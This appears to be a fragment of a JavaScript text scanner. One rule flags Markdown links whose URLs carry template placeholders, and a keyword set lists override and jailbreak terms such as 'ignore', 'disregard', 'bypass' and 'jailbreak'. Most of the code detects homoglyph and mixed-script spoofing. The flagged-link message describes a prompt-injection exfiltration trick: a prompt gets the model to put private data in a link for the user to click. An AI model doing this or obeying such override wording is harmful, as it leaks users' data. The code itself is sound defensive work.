    add({ severity: 'warning', category: 'markdown_exfil', code: 'link_placeholder', count: 1, index: idx, positions: [idx], url: clip(url, 300), excerpt: lazy(() => reveal(text.slice(st, st + Math.min(len, 200)), 200)),
      message: 'Markdown link whose URL contains a template placeholder: a prompt can ask the model to fill in private data and get the user to click it.', fix: 'Do not render links from model output that carry data in the URL, or show the full URL before opening it.' });
  }
}

const NOT_ASCII_LETTER = /[^A-Za-z]+/g; const NON_ASCII_G = new RegExp('[[\\p{L}\\p{M}\\p{N}]--[\\x00-\\x7F]]', 'gv'); // non-ASCII letters, marks, digits
const WORD_Y = /[\p{L}\p{M}\p{N}_\u200B-\u200D\u2060\uFEFF\u00AD]+/uy;
const asciiWordUnit = (c) => (c >= 0x30 && c <= 0x39) || (c >= 0x41 && c <= 0x5A) || (c >= 0x61 && c <= 0x7A) || c === 0x5F || (c >= 0x200B && c <= 0x200D) || c === 0x2060 || c === 0xFEFF || c === 0xAD; const NON_ASCII = /[^\x00-\x7F]/; const WORD_MAX = 64;
const CJK_SCRIPTS = new Set(['Han', 'Hiragana', 'Katakana', 'Hangul', 'Bopomofo']);
const SPLIT_KEYWORDS = new Set(['ignore', 'disregard', 'forget', 'override', 'bypass', 'instructions', 'instruction', 'previous', 'system', 'prompt', 'jailbreak', 'password', 'secret', 'execute', 'admin', 'developer', 'unrestricted']);
const QUOTES = new Set([...'"\'“”‘’«»„‚‹›「」『』']);
const SYMBOL_LETTERS = new Set([...'ΩωμµΔδλπσΣθΘφΦαβγΓεηρτψΨ']);
function confusablePass(text, u2c, add) {
  if (!/[^\x00-\x7F]/.test(text)) return;
  const words = new Map(); let latinLetters = text.replace(NOT_ASCII_LETTER, '').length, otherLetters = 0, cjkLetters = 0; let seen = 0;
  // Visit only words that contain a non-ASCII letter/mark/digit: jump to the next one (native search), extend left over
  // ASCII word characters and zero-width/soft-hyphen units (numeric test) and right with one sticky native match. Each character is visited O(1) times.
  NON_ASCII_G.lastIndex = 0; let lastE = 0;
  for (;;) {
    const hit = NON_ASCII_G.exec(text); if (!hit) break;
    const a = hit.index;
    WORD_Y.lastIndex = a; const wm = WORD_Y.exec(text); // always matches: the hit is a word character
    let s0 = a; while (s0 > lastE && asciiWordUnit(text.charCodeAt(s0 - 1))) s0--;
    const e0 = a + wm[0].length; lastE = e0; NON_ASCII_G.lastIndex = e0;
    if (++seen > 20000) break;
    const raw = text.slice(s0, e0); const m = { index: s0 };
    const w = (raw.length > WORD_MAX ? Array.from(raw.slice(0, WORD_MAX + 1)).slice(0, WORD_MAX).join('') : raw).replace(/[\u200B-\u200D\u2060\uFEFF\u00AD]/g, '');
    let e = words.get(w);
    if (!e) { if (words.size >= 2000) continue; e = { count: 0, index: u2c[m.index], quoted: QUOTES.has(text[m.index - 1]) && QUOTES.has(text[m.index + raw.length]) }; words.set(w, e); }
    e.count++;
  }
  const info = new Map();
  for (const [w, e] of words) {
    const sc = new Set(); let letters = 0;
    for (const ch of w) if (RE.LETTER.test(ch)) { letters++; const s = scriptOf(ch); if (s === 'Latin') { if (ch.charCodeAt(0) > 0x7F) latinLetters += e.count; } else { otherLetters += e.count; if (CJK_SCRIPTS.has(s)) cjkLetters += e.count; } if (s !== 'Common' && s !== 'Inherited') sc.add(s); }
    info.set(w, { sc, letters });
  }
  const latinDominant = latinLetters > 0 && latinLetters >= otherLetters;
  const cjkDominant = cjkLetters > 0 && cjkLetters >= latinLetters;
  // Scripts that also appear in words that do NOT look like Latin are genuine language use (e.g. a Greek phrase), so
  // whole-script confusable checks only fire for scripts used exclusively in Latin-looking words.
  const genuine = new Set();
  for (const [w, { sc }] of info) {
    if (sc.size !== 1) continue;
    let all = true; for (const ch of w) { if (!RE.LETTER.test(ch)) continue; const p = asciiProto(ch); if (!(p && /^[A-Za-z]+$/.test(p))) { all = false; break; } }
    if (!all) genuine.add([...sc][0]);
  }
  let emitted = 0;
  for (const [w, e] of words) {
    if (emitted >= MAX_CONFUSABLE_WORDS) break;
    const { sc, letters } = info.get(w);
    const base = { category: 'confusables', count: e.count, index: e.index, positions: [e.index], word: reveal(w, 80), scripts: [...sc].sort() };
    // Compatibility look-alikes: full-width, mathematical alphanumerics, enclosed letters.
    let compat = 0; for (const ch of w) if (ch.codePointAt(0) > 0x7F && /^[A-Za-z0-9]+$/.test(ch.normalize('NFKC'))) compat++;
    const nfkc = w.normalize('NFKC');
    if (compat && /^[\x21-\x7E]+$/.test(nfkc)) {
      // Full-width digits and Latin are ordinary in Japanese/Chinese/Korean typesetting (０３−１２３４, ＵＳＢ).
      const routine = /^[0-9]+$/.test(nfkc) || cjkDominant;
      add({ ...base, severity: compat >= 3 && !routine ? 'warning' : 'info', code: 'compat_lookalike', looksLike: clip(nfkc, 80), message: `"${reveal(w, 40)}" uses ${compat} full-width / styled / mathematical letter(s) that look like ASCII "${clip(nfkc, 40)}". Keyword filters that do not normalize miss it.`, fix: 'Apply NFKC normalization before filtering or comparing.' });
      emitted++; continue;
    }
    if (mixedScript(sc)) {
      if (sc.has('Latin')) {
        let spoof = true; let looks = '';
        for (const ch of w) {
          if (!RE.LETTER.test(ch) || scriptOf(ch) === 'Latin' || scriptOf(ch) === 'Common' || scriptOf(ch) === 'Inherited') { looks += ch; continue; }
          const p = asciiProto(ch); if (p) looks += p; else { spoof = false; looks += ch; }
        }
        if (spoof && /^[\x21-\x7E]+$/.test(looks.normalize('NFKC'))) {
          add({ ...base, severity: 'critical', code: 'mixed_script_spoof', looksLike: clip(looks, 80), skeleton: clip(skeleton(w), 80), message: `"${reveal(w, 40)}" mixes ${[...sc].join(' + ')} letters and reads as "${clip(looks, 40)}": a homoglyph spoof of a Latin word (brand, domain, command or keyword).`, fix: 'Reject mixed-script identifiers, or compare UTS #39 skeletons against the names you protect.' });
          emitted++; continue;
        }
      }
      // Greek letters used as unit/maths symbols next to Latin (10kΩ, μm, ΔT, λmax) are routine: info.
      let symbolOnly = true; for (const ch of w) { if (!RE.LETTER.test(ch)) continue; const s2 = scriptOf(ch); if (s2 === 'Latin' || s2 === 'Common' || s2 === 'Inherited') continue; if (!SYMBOL_LETTERS.has(ch)) { symbolOnly = false; break; } }
      add({ ...base, severity: symbolOnly ? 'info' : 'warning', code: 'mixed_script', skeleton: clip(skeleton(w), 80), message: `"${reveal(w, 40)}" mixes ${[...sc].join(' + ')} letters in one word, which UTS #39 treats as suspicious.`, fix: 'Check whether the word is meant to be written in one script.' });
      emitted++; continue;
    }
    if (latinDominant && sc.size === 1 && letters >= 3) {
      const [s] = sc;
      if (!SPOOF_SCRIPTS.has(s) || genuine.has(s)) continue;
      let looks = ''; let all = true;
      for (const ch of w) { if (!RE.LETTER.test(ch)) { looks += ch; continue; } const p = asciiProto(ch); if (p && /^[A-Za-z]+$/.test(p)) looks += p; else { all = false; break; } }
      if (all) {
        // A quoted foreign word (The Russian word "сор" means…) is a mention, not a spoof: info.
        add({ ...base, severity: e.quoted ? 'info' : 'warning', code: 'whole_script_confusable', looksLike: clip(looks, 80), skeleton: clip(skeleton(w), 80), message: `"${reveal(w, 40)}" is written entirely in ${s} letters that look like the Latin word "${clip(looks, 40)}", inside mostly Latin text.`, fix: 'Treat it as a possible spoof; compare skeletons against protected names.' });
        emitted++;
      }
    }
  }
}
